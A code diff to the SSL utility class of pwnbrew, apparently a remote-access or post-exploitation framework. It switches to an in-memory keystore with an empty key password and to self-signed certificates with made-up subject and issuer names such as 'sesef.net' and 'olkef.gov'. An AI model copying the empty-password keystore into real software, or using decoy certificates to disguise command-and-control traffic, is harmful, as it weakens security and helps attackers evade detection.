@@ -45,8 +45,6 @@ The copyright on this package is held by Securifera, Inc
 
 package pwnbrew.misc;
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.security.InvalidKeyException;
 import java.security.Key;
@@ -61,16 +59,12 @@ import java.security.UnrecoverableKeyException;
 import java.security.cert.Certificate;
 import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
-import java.util.List;
-import java.util.logging.Level;
 import javax.net.ssl.KeyManagerFactory;
 import javax.net.ssl.SSLContext;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.TrustManagerFactory;
 import javax.net.ssl.X509TrustManager;
 import pwnbrew.ClientConfig;
-import pwnbrew.Persistence;
-import pwnbrew.log.RemoteLog;
 import pwnbrew.log.LoggableException;
 /**
  *
@@ -124,10 +118,10 @@ final public class SSLUtilities {
      * @throws LoggableException 
      */
     public static synchronized KeyStore getKeystore() throws LoggableException {
-       if(theKeystore == null){
-          theKeystore = loadKeystore( ClientConfig.getConfig() );
-       }
-       return theKeystore;
+        if(theKeystore == null)
+            theKeystore = loadKeystore( ClientConfig.getConfig() );
+
+        return theKeystore;
     }
 
     //===============================================================
@@ -143,181 +137,48 @@ final public class SSLUtilities {
         boolean saveConf = false;     
 
         try{
+            
+            tempKeystore = KeyStore.getInstance("JKS");
+            tempKeystore.load(null);
 
-            //The keystore password
-            String keyStorePass;
-            List<byte[]> theConfEntries = Persistence.getLabelBytes( Persistence.SSL_CHUNK );
-            if( theConfEntries.isEmpty() ){    
-                
-                //Create a random keypass
-                keyStorePass = Utilities.simpleEncrypt(Integer.toString(SocketUtilities.SecureRandomGen.nextInt()), Long.toString(SocketUtilities.SecureRandomGen.nextLong()));
-                tempKeystore = createKeystore( keyStorePass );
+            //Try and get the hostname
+            String hostname = SocketUtilities.getHostname();
 
-                //Set the keypath and passphrase
-                theConf.setKeyStorePass(keyStorePass);
-                saveConf = true;
+            //Get the new alias and set it
+            String theAlias = new StringBuilder().append(hostname)
+                .append("_").append(SocketUtilities.getNextId()).toString();
 
-            } else {
-
-                //Get the keystore pass
-                keyStorePass = theConf.getKeyStorePass();
-                
-                //Loop through the return entries
-                for( byte[] theBytes : theConfEntries ){
-                
-                    ByteArrayInputStream theBIS = new ByteArrayInputStream( theBytes );
-                    try {
-
-                        //Load the keystore
-                        tempKeystore = KeyStore.getInstance("JKS");                      
-                        tempKeystore.load(theBIS, keyStorePass.toCharArray());
-                        break;
-
-                    } catch(IOException ex){
-
-                        //Ensure the file stream is closed
-                        try {
-                            theBIS.close();
-                        } catch (IOException ex1 ) {
-                            ex1 = null;
-                        }
-
-                        //Log it
-                        RemoteLog.log(Level.INFO, NAME_Class, "loadKeystore()", ex.getMessage(), ex);
-
-                        //If the keystore password doesn't work then create a new one
-                        if(ex.getMessage().contains("tampered")){
-
-                            //Delete the keystore
-                            Persistence.removeLabel( Persistence.SSL_CHUNK );
-                            //Try and load it again
-                            try {
-                                return SSLUtilities.loadKeystore(theConf);
-                            } catch (LoggableException ex1) {    
-                                ex1 = null;
-                            }
-                            
-                        }
-
-                    } finally {
-
-                        //Ensure the file stream is closed
-                        try {
-                            theBIS.close();
-                        } catch (IOException ex) {
-                            ex = null;
-                        }
-                    }
-                }
-
-            }
-
-            String theAlias = theConf.getAlias();
-            //If the alias is not set then it hasn't been replaced
-            if(theAlias == null || theAlias.isEmpty()){
-
-                //Try and get the hostname
-                String hostname = SocketUtilities.getHostname();
-
-                //Get the new alias and set it
-                theAlias = new StringBuilder().append(hostname)
-                   .append("_").append(SocketUtilities.getNextId()).toString();
-
-                theConf.setAlias(theAlias);
-                saveConf = true;
-
-            }
-
-            //Check that the host alias has a certificate
-            if(!checkAlias(tempKeystore, theAlias)){
-               createSelfSignedCertificate(tempKeystore, keyStorePass, theAlias);
-            }
+            createSelfSignedCertificate(tempKeystore, theAlias);
 
         } catch (NoSuchAlgorithmException | CertificateException | KeyStoreException | IOException ex) {
            throw new LoggableException(ex);
         } finally {
 
             //Write to disk if needed
-            if( saveConf ){
+            if( saveConf )
                 theConf.writeSelfToDisk();
-            }    
+               
         }
 
         return tempKeystore;
 
-    }
-
-    //===============================================================
-    /**
-     *  * Returns a file representing a java keystore
-     * 
-     * @param keystorePass
-     * @return
-     * @throws KeyStoreException
-     * @throws IOException
-     * @throws NoSuchAlgorithmException
-     * @throws CertificateException
-     * @throws LoggableException 
-    */    
-    private static KeyStore createKeystore( String keystorePass ) throws KeyStoreException, IOException, NoSuchAlgorithmException, CertificateException, LoggableException {
-
-        KeyStore tempKeystore = KeyStore.getInstance("JKS");
-        tempKeystore.load(null);
-
-        //Save it
-        saveKeyStore( tempKeystore, keystorePass );      
-        
-        return tempKeystore;
-    }
-
-    //===============================================================
-    /**
-     *  
-     * 
-     * @param passedKeyStore
-     * @param keystorePass
-     * @return 
-     */
-    private static void saveKeyStore( KeyStore passedKeyStore, String keystorePass ) throws LoggableException{
-        
-        //Write the keystore back to disk        
-        try {
-            
-            ByteArrayOutputStream theOS = new ByteArrayOutputStream();
-            try {    
-                //Store the keystore in the byte array stream
-                passedKeyStore.store(theOS, keystorePass.toCharArray());            
-            } finally {            
-                try { theOS.close(); } catch (IOException ex) { ex = null; }            
-            }
-
-            //Get the bytes 
-            byte[] objectBytes = theOS.toByteArray();
-            Persistence.writeLabel( Persistence.SSL_CHUNK, objectBytes);
-            
-        } catch (KeyStoreException | CertificateException | NoSuchAlgorithmException | IOException ex) {
-           throw new LoggableException(ex);
-        }
-        
     }
     
     //===============================================================
     /**
      * Returns a file representing a java keystore
     */
-    private static void createSelfSignedCertificate(KeyStore passedKeyStore, String keystorePass, String hostAlias ) throws LoggableException {
+    private static void createSelfSignedCertificate(KeyStore passedKeyStore, String hostAlias ) throws LoggableException {
      
-        String distName = "CN=PWN, OU=PLACE, O=ORG, L=CITY, S=STATE, C=COUNTRY";
+        String distName = "CN=sesef.net, O=RSA, L=lkjfe, S=CA, C=USA";
+        String issuerName = "CN=olkef.gov, O=sfsefse, L=sefesf, S=CA, C=USA";
 
         try {
-            Object[] theObjArr = X509CertificateFactory.generateCertificate( distName, 365, "RSA", 2048 );
+            Object[] theObjArr = X509CertificateFactory.generateCertificate( distName, issuerName, 365, "RSA", 2048 );
             Key theKey = (Key) theObjArr[0];
             Certificate newCert = (Certificate) theObjArr[1];
 
-            passedKeyStore.setKeyEntry(hostAlias, theKey, keystorePass.toCharArray(), new Certificate[]{newCert});
-
-            //Save it
-            saveKeyStore( passedKeyStore, keystorePass ); 
+            passedKeyStore.setKeyEntry(hostAlias, theKey, "".toCharArray(), new Certificate[]{newCert});
 
         } catch (KeyStoreException | CertificateException | InvalidKeyException | NoSuchAlgorithmException | NoSuchProviderException | SignatureException | IOException ex) {
            throw new LoggableException(ex);
@@ -348,17 +209,13 @@ final public class SSLUtilities {
     public static SSLContext createServerSSLContext() throws LoggableException {
 
         SSLContext aContext = null;
-
-        ClientConfig theConf = ClientConfig.getConfig();
         KeyStore theKeyStore = SSLUtilities.getKeystore();
-        String keyStorePass = theConf.getKeyStorePass();
-
-        if(theKeyStore != null && !keyStorePass.isEmpty()){
+        if(theKeyStore != null ){
 
             try {
                 
                 KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
-                kmf.init(theKeyStore, keyStorePass.toCharArray());
+                kmf.init(theKeyStore, "".toCharArray());
 
                 TrustManagerFactory tmf = TrustManagerFactory.getInstance("SunX509");
                 tmf.init(theKeyStore);
@@ -374,25 +231,5 @@ final public class SSLUtilities {
 
         return aContext;
     }
-    
-//    //===============================================================
-//    /**
-//     * Returns the SSL context for the comm
-//     *
-//     * @return
-//     */
-//    public static synchronized SSLContext getSSLContext( boolean client ) throws LoggableException {
-//
-//        //If the context has not be created than create it
-//        if ( theSSLContext == null ){       
-//            if( client ){
-//                theSSLContext = createSSLContext();    
-//            } else {
-//                theSSLContext = createServerSSLContext();
-//            } 
-//        }
-//
-//        return theSSLContext;
-//    }
 
 }/* END CLASS SSLUtilities */
